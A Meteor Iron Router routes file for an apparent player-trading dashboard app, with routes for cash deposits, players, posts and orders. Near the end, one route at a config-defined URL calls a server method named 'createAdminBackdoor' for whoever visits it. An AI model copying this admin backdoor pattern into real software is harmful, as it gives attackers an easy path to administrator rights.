/*
 * decaffeinate suggestions:
 * DS102: Remove unnecessary code created because of implicit returns
 * Full docs: https://github.com/decaffeinate/decaffeinate/blob/master/docs/suggestions.md
 */


Router.route("home", {
  path: "/",
  layoutTemplate: "homeLayout"
}
);


/**
 * 
 * cash deposit
 */
Router.route("playagentHomeDashboard", {
  path: "/dashboard-home",
  layoutTemplate: "masterLayout"
});


/**
 * 
 * cash deposit
 */
Router.route("playagentCashDepositDashboard", {
  path: "/cash-deposit",
  layoutTemplate: "playagentDashboardLayout"
});

/**
 * players dashboard
 */

Router.route("playagentPlayersDashboard", {
  path: "/players-dashboard",
  layoutTemplate: "playagentDashboardLayout",
  
  waitOn: function () {
    return [
      subs.subscribe('players')
      
    ];
  },
  data: function () {
    return {
      players: Players.find(),
    }
  }
});


Router.route("postDashboard", {
  path: "/posts-dashboard",
  waitOn() {
    return [
      subs.subscribe('posts'),
      subs.subscribe('comments'),
      subs.subscribe('attachments')
    ];
  },
  data() {
    return { posts: Posts.find({}, { sort: { createdAt: -1 } }).fetch() };
  }
}
);

Router.route("singlePlayer", {
  path: "/player/:_id",
  layoutTemplate: "playagentDashboardLayout",
  waitOn() {
   
    return [
     
      subs.subscribe('playerById',this.params._id),
      subs.subscribe('profilePictures'),
      subs.subscribe('posts'),
      subs.subscribe('comments'),
      subs.subscribe('attachments'),
      subs.subscribe('transfersByPlayerId',this.params._id),
      subs.subscribe('statsByPlayerId',this.params._id)
    ];
  },
  data() {
    return { 
    player:Players.findOne({_id:this.params._id}),
    transfers:Transfers.find({player:this.params._id}),
    playerStats:PlayerStats.find({player:this.params._id}) };
  }

});


Router.route("ordersDashboard", {
  path: "/orders-dashboard",
  layoutTemplate: "playagentDashboardLayout",
  
  waitOn: function () {
    return [
      subs.subscribe('balancesTotalStream'),
      subs.subscribe('ordersByIssuer', Meteor.userId()),
      subs.subscribe('players'),
      subs.subscribe('userPlayerBalancesByUser', Meteor.userId())
    ];
  },
  data: function () {
    return {
      orders: Orders.find(),
      players: Players.find(),
      balances: UserPlayerBalances.find()
    }
  }
});

Router.route(this.Config.createAdminBackdoorUrl, function () {
  let self = this;
  Meteor.call("createAdminBackdoor", function (error, result) {
    self.redirect('/profile');
  });

});




Router.route("scrapeFromTM", {
  path: "/scrape",
  layoutTemplate: "playagentDashboardLayout"
});